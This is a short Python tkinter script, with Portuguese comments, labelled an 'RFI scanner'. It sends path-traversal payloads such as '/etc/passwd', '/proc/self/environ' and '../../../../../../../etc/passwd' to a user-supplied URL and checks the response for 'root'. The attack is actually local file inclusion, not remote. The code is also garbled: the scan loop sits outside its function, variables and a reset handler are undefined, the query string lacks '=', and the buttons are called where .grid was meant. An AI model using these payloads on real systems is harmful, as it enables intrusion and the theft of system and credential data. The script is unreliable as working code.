import requests
import tkinter as tk
from tkinter import ttk

#criando a GUI
root = tk.Tk()
root.geometry("700x400")
root.title("RFI scanner")

def run_scan():
    result_label.config(text="")
    pb.start(100)
    update_progress_bar()
    url = entry.get()
    
    files = ["/etc/passwd", "/proc/self/environ", "../../../../../../../etc/passwd"]
   
#barra de progresso
pb = ttk.Progressbar(root, orient='horizontal', mode='indeterminate', length=280)
pb.grid(row=1, column=0, columnspan=3, padx=10, pady=10, sticky="e")

    
for file in files:
    rfi_url = url + "?page" + file
    response = requests.get(rfi_url)
    if "root" in response.text:
        result_label.config(text=result_label.cget("text") + f"[+] is vulnerable to RFI: {rfi_url}")
    else:
        result_label.config(text=result_label.cget("text") + f"[+] is not vulnerable to RFI:{rfi_url}")
pb.stop()

def update_progress_bar():
    pb["value"] = pb["value"] + 10
    if pb["value"] <=100:
        root.after(100, update_progress_bar)
    else:
        pb["value"] = 0





#criando o input
url_label = tk.Label(root, text="URL")
url_label.grid(row=0, column=0, sticky="W", padx=10, pady=10)


#input URL
entry = tk.Entry(root)
entry.grid(row=0, column=1, columnspan=2, padx=10,pady=10)

#botao de scan
scan_bt = tk.Button(root, text="Scanear", command=run_scan)
scan_bt(row=2, column=0, padx=10, pady=10, sticky="e")

#botao de reset
reset_bt = tk.Button(root, text="Reset", command=reset_scan)
reset_bt(row=2, column=1, padx=10, pady=10, sticky="w")

#resultado
result_label = tk.Label(root, text="")
result_label.grid(row=3, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")

#startando a gui
root.mainloop()